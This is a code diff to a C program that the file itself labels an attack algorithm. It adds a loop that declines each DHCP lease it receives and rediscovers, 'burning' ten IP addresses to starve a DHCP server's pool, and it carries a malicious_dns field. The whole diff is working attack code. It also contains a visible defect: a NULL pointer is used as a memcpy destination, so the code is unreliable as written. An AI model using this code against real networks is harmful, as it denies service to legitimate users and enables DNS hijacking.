@@ -6,6 +6,7 @@
 #include "utils/utils.h"
 
 #include <string.h>
+#include <unistd.h>
 
 #define DESCRIPTION_INSTANCE "attack algorithm"
 
@@ -15,6 +16,7 @@ struct attack_s {
     uint8_t mac[LENGTH_MAC_ADDRESS_AS_BYTES];
     char interface_name[LENGTH_INTERFACE_NAME];
     dhcp_client_t dhcp_client;
+    size_t burned_ips;
 };
 
 static void _build_dhcp_client(attack_t instance, attack_args_t args);
@@ -68,6 +70,7 @@ static void _build_logger(attack_t instance, attack_args_t args) {
 
 static void _extract_fields(attack_t instance, attack_args_t args) {
     instance->malicious_dns = args.malicious_dns;
+    instance->burned_ips = 10;
     strcpy(instance->interface_name, args.interface_name);
     memcpy(instance->mac, args.mac, sizeof(instance->mac));
 }
@@ -75,6 +78,23 @@ static void _extract_fields(attack_t instance, attack_args_t args) {
 static void _on_ack_callback(dhcp_client_t dhcp_client, void *args, dhcp_client_ack_data_t data) {
     attack_t instance = args;
     logger_info(instance->logger, "Just received a DHCP ACK");
+
+    dhcp_client_decline_data_t decline_data = {
+        .mac = NULL,
+        .ack_data = data
+    };
+
+    memcpy(decline_data.mac, instance->mac, LENGTH_MAC_ADDRESS_AS_BYTES);
+
+    if (instance->burned_ips--) {
+        logger_info(instance->logger, "Burning another IP...");
+        dhcp_client_decline(dhcp_client, decline_data);
+
+        sleep(11);
+        dhcp_client_discovery(dhcp_client, instance->mac);
+    } else {
+        logger_info(instance->logger, "Finished attack! <3");
+    }
 }
 
 static void _on_offer_callback(dhcp_client_t dhcp_client, void *args, dhcp_client_offer_data_t data) {
